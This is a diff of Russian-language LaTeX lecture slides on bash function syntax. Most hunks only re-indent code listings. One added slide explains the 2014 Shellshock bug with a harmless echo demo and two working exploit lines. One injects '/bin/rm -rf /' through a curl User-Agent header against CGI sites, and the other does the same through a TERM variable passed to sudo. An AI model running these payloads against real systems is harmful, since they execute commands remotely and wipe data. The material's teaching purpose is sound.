@@ -24,22 +24,64 @@
 			\begin{lstlisting}
 function function_name {
   command...
-} 
-			\end{lstlisting}
+}
+\end{lstlisting}
 		\item Портабельный (C-style):
 			\begin{lstlisting}
 function_name()
 {
   command...
 } 
-			\end{lstlisting}
+\end{lstlisting}
 
 		\item Однострочный:
 			\begin{lstlisting}
 function_name () { command... ;}
-			\end{lstlisting}
+\end{lstlisting}
   \end{itemize}
 \end{frame}
+
+\begin{frame}[fragile]
+	\frametitle{Пример: shellshock}
+	\begin{block}{Однострочный синтаксис}
+			\begin{lstlisting}
+function_name () { command... ;}
+\end{lstlisting}
+	\end{block}
+
+    В 2014 году вскрылась уязвимость, существовавшая с {\bf 1992} г.:
+
+	\begin{block}{Shellshock}
+			\begin{lstlisting}
+export badvar='(){:;}; echo "The Matrix has you"'
+bash -c "echo Just a simple shell call"
+\end{lstlisting}
+	\begin{itemize}
+	    \item Объявление переменной
+	    \item Создание процесса, наследующего опасную переменную
+	    \item При инициализации окружения {\tt bash} запускает на выполнение все, что следует за ``объявлением'' функции
+	\end{itemize}
+	\end{block}
+
+\end{frame}
+
+	\begin{block}{Пример использования}
+	На любой уязвимый сайт с CGI-скриптами:
+			\begin{lstlisting}
+curl -H "User-Agent: () { :; }; /bin/rm -rf /" http://example.com/
+\end{lstlisting}
+	 В CGI все заголовки преобразуются в переменные окружения.
+	\end{block}
+
+	\begin{block}{Пример использования 2}
+	Для любой команды {\tt sudo}
+			\begin{lstlisting}
+TERM='() { :; }; /bin/rm -rf / ' sudo mount /dev/cdrom
+\end{lstlisting}
+	Переменная {\tt TERM} не преобразуется и не сбрасывается.
+	\end{block}
+
+
 
 \begin{frame}[fragile]
 	\frametitle{Пример (начало)}
@@ -61,7 +103,7 @@ f2(){
     echo ${FUNCNAME}: прочитана строка: $str
   done
 }
-	\end{lstlisting}
+\end{lstlisting}
 
 \end{frame}
 
@@ -80,7 +122,7 @@ f1 "$@"
 done } | f2
 
 exit
-	\end{lstlisting}
+\end{lstlisting}
 
 \end{frame}
 
@@ -115,7 +157,7 @@ f2
 echo After f2: VAR=$VAR
 
 exit
-		\end{lstlisting}
+\end{lstlisting}
 	\end{columns}
 
 \end{frame}
